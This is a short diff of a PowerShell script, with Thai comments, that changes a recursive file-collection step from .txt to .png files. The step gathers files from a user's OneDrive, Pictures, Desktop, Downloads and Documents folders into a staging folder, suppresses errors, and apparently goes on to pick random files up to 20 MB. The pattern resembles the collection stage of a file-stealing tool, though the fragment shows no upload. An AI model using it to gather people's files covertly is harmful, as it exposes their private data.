@@ -12,7 +12,7 @@ New-Item -ItemType Directory -Force -Path $selectedFilesFolder
 New-Item -ItemType Directory -Force -Path $testExtractFolder
 
 # เก็บไฟล์ PowerShell (.ps1) ในโฟลเดอร์ Documents มาไว้ในโฟลเดอร์ที่กำหนด
-Get-ChildItem -Path "C:\Users\Lenovo\OneDrive", "$env:USERPROFILE\Videos", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents" -Filter *.txt -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $zipFolder -Force
+Get-ChildItem -Path "C:\Users\Lenovo\OneDrive", "$env:USERPROFILE\Videos", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents" -Filter *.png -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $zipFolder -Force
 
 # เลือกไฟล์แบบสุ่มให้อยู่ในขนาดไม่เกิน 20 MB
 $maxSize = 20MB
